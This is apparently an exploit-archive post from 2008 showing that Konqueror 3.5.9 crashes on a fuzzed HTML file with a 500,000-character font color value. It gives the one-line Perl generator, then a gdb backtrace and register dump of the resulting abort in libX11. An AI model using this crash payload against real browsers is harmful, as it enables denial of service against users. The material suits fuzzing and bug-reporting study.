@@ -1,0 +1,96 @@
+Konqueror isn't immune from fuzzing either
+Konqueror, KDE's mighty mascot browser.. fuzzed.
+
+perl -e 'print "<html>\n" . "<font color=" . "A" x 500000 . "\n</html>"' > kdie.html
+
+#6 0xb7f8d410 in __kernel_vsyscall ()
+#7 0xb7cf2085 in raise () from /lib/tls/i686/cmov/libc.so.6
+#8 0xb7cf3a01 in abort () from /lib/tls/i686/cmov/libc.so.6
+#9 0xb7ceb10e in __assert_fail () from /lib/tls/i686/cmov/libc.so.6
+#10 0xb6e94d10 in ?? () from /usr/lib/libX11.so.6
+#11 0xb6e9518a in _XPutXCBBuffer () from /usr/lib/libX11.so.6
+#12 0xb6e965df in _XSend () from /usr/lib/libX11.so.6
+#13 0xb6e7c758 in XLookupColor () from /usr/lib/libX11.so.6
+#14 0xb71a61d1 in QColor::setSystemNamedColor () from /usr/lib/libqt-mt.so.3
+#15 0xb721c446 in QColor::setNamedColor () from /usr/lib/libqt-mt.so.3
+#16 0xb60c5250 in ?? () from /usr/lib/libkhtml.so.4
+#17 0xb60d143b in DOM::CSSParser::parseColorFromValue ()
+from /usr/lib/libkhtml.so.4
+#18 0xb60d216d in DOM::CSSParser::parseColor () from /usr/lib/libkhtml.so.4
+#19 0xb60d3c9f in DOM::CSSParser::parseValue () from /usr/lib/libkhtml.so.4
+#20 0xb60d7a09 in ?? () from /usr/lib/libkhtml.so.4
+#21 0xb60d8134 in DOM::CSSParser::runParser () from /usr/lib/libkhtml.so.4
+#22 0xb60d85a2 in DOM::CSSParser::parseValue () from /usr/lib/libkhtml.so.4
+#23 0xb60d86e1 in ?? () from /usr/lib/libkhtml.so.4
+#24 0xb601f0e9 in ?? () from /usr/lib/libkhtml.so.4
+#25 0xb6021711 in ?? () from /usr/lib/libkhtml.so.4
+#26 0xb6002b8a in ?? () from /usr/lib/libkhtml.so.4
+#27 0xb602da00 in ?? () from /usr/lib/libkhtml.so.4
+#28 0xb602dc96 in ?? () from /usr/lib/libkhtml.so.4
+#29 0xb603b11f in ?? () from /usr/lib/libkhtml.so.4
+#30 0xb603d5ae in ?? () from /usr/lib/libkhtml.so.4
+#31 0xb5fb064e in KHTMLPart::write () from /usr/lib/libkhtml.so.4
+#32 0xb5fa50c4 in KHTMLPart::slotData () from /usr/lib/libkhtml.so.4
+#33 0xb5fd527f in KHTMLPart::qt_invoke () from /usr/lib/libkhtml.so.4
+#34 0xb7277704 in QObject::activate_signal () from /usr/lib/libqt-mt.so.3
+#35 0xb7ab2dcd in KIO::TransferJob::data () from /usr/lib/libkio.so.4
+#36 0xb7ab2e38 in KIO::TransferJob::slotData () from /usr/lib/libkio.so.4
+#37 0xb7afa659 in KIO::TransferJob::qt_invoke () from /usr/lib/libkio.so.4
+#38 0xb7277704 in QObject::activate_signal () from /usr/lib/libqt-mt.so.3
+#39 0xb7ab11ae in KIO::SlaveInterface::data () from /usr/lib/libkio.so.4
+#40 0xb7af9e89 in KIO::SlaveInterface::dispatch () from /usr/lib/libkio.so.4
+#41 0xb7b1be4a in KIO::SlaveInterface::dispatch () from /usr/lib/libkio.so.4
+#42 0xb7ac2d7c in KIO::Slave::gotInput () from /usr/lib/libkio.so.4
+#43 0xb7af1278 in KIO::Slave::qt_invoke () from /usr/lib/libkio.so.4
+#44 0xb7277704 in QObject::activate_signal () from /usr/lib/libqt-mt.so.3
+#45 0xb7278051 in QObject::activate_signal () from /usr/lib/libqt-mt.so.3
+#46 0xb7607b99 in QSocketNotifier::activated () from /usr/lib/libqt-mt.so.3
+#47 0xb7299766 in QSocketNotifier::event () from /usr/lib/libqt-mt.so.3
+#48 0xb720bc36 in QApplication::internalNotify () from /usr/lib/libqt-mt.so.3
+#49 0xb720da5f in QApplication::notify () from /usr/lib/libqt-mt.so.3
+#50 0xb7911672 in KApplication::notify () from /usr/lib/libkdecore.so.4
+#51 0xb719c28d in QApplication::sendEvent () from /usr/lib/libqt-mt.so.3
+#52 0xb71fdb4a in QEventLoop::activateSocketNotifiers ()
+from /usr/lib/libqt-mt.so.3
+#53 0xb71b1630 in QEventLoop::processEvents () from /usr/lib/libqt-mt.so.3
+#54 0xb7226f90 in QEventLoop::enterLoop () from /usr/lib/libqt-mt.so.3
+#55 0xb7226c8e in QEventLoop::exec () from /usr/lib/libqt-mt.so.3
+#56 0xb720d7df in QApplication::exec () from /usr/lib/libqt-mt.so.3
+#57 0xb666390a in kdemain () from /usr/lib/libkdeinit_konqueror.so
+#58 0xb6748454 in kdeinitmain () from /usr/lib/kde3/konqueror.so
+#59 0x0804ee20 in ?? ()
+#60 0x0804f541 in ?? ()
+#61 0x0804fa7b in ?? ()
+#62 0x0805057d in ?? ()
+#63 0xb7cdd450 in __libc_start_main () from /lib/tls/i686/cmov/libc.so.6
+#64 0x0804bb91 in ?? ()
+
+Looks like it might have something to do with libx11...
+
+konqueror: ../../src/xcb_lock.c:89: request_length: Assertion `vec[0].iov_len >= 4' failed.
+
+Program received signal SIGABRT, Aborted.
+[Switching to Thread 0xb660f6c0 (LWP 10553)]
+0xb7eef410 in __kernel_vsyscall ()
+(gdb) i r
+eax 0x0 0
+ecx 0x2939 10553
+edx 0x6 6
+ebx 0x2939 10553
+esp 0xbf855efc 0xbf855efc
+ebp 0xbf855f18 0xbf855f18
+esi 0x2939 10553
+edi 0xb7cd8ff4 -1211265036
+eip 0xb7eef410 0xb7eef410 <__kernel_vsyscall+16>
+eflags 0x206 [ PF IF ]
+cs 0x73 115
+ss 0x7b 123
+ds 0x7b 123
+es 0x7b 123
+fs 0x0 0
+gs 0x33 51
+(gdb)
+
+Tested on Ubuntu 8.04 + Konqueror 3.5.9 , fully patched. Peace. 
+
+# milw0rm.com [2008-10-06]
